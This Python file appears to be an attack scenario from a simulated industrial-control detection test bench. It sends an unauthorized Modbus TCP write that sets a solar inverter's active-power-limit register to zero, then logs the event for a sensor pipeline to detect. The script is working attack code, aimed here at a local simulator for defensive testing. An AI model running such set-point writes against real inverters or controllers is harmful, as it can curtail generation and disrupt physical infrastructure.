"""
Scenario S2: Unauthorized Inverter Set-Point Write.
Attacker (10.10.1.99) writes 0 kW to inverter-2 active-power-limit set-point (register 101).
Expected detection: "inverter-2 set-point written by 10.10.1.99; only 10.10.1.30 is allowed to write it"
MITRE ATT&CK for ICS: T0836
"""
import time
from pymodbus.client import ModbusTcpClient
from sim.common import (
    iso_utc_now, IP_ATTACKER, IP_INVERTER_2,
    PORT_INVERTER_2, REG_ACTIVE_POWER_LIMIT
)
from scenarios.common import log_attack_run

def run_s2(target_ip: str = IP_INVERTER_2, target_port: int = PORT_INVERTER_2, sensor_pipeline=None, run_id: str = None) -> dict:
    t0 = iso_utc_now()
    epoch = time.time()
    desc = f"Attacker writes 0 kW to {target_ip} register 101 to curtail generation"

    # Attempt live Modbus TCP write
    try:
        client = ModbusTcpClient("127.0.0.1", port=target_port, timeout=1.0)
        if client.connect():
            client.write_register(REG_ACTIVE_POWER_LIMIT, 0)
            client.close()
    except Exception:
        pass

    # Feed event to sensor pipeline if provided
    if sensor_pipeline:
        sensor_pipeline.process_raw_event({
            "time": t0,
            "timestamp_epoch": epoch,
            "src_ip": IP_ATTACKER,
            "src_mac": "02:42:0a:0a:01:99",
            "dst_ip": target_ip,
            "dst_mac": "02:42:0a:0a:01:0c",
            "protocol": "MODBUS_TCP",
            "function": "WRITE_SINGLE_REGISTER",
            "address": REG_ACTIVE_POWER_LIMIT,
            "value": 0,
            "unit_id": 1,
            "raw_summary": f"Modbus FC06 Write Reg {REG_ACTIVE_POWER_LIMIT} = 0"
        })

    time.sleep(0.1)
    t1 = iso_utc_now()
    return log_attack_run("S2", IP_ATTACKER, target_ip, desc, t0, t1, run_id)

if __name__ == "__main__":
    rec = run_s2()
    print("S2 executed:", rec)
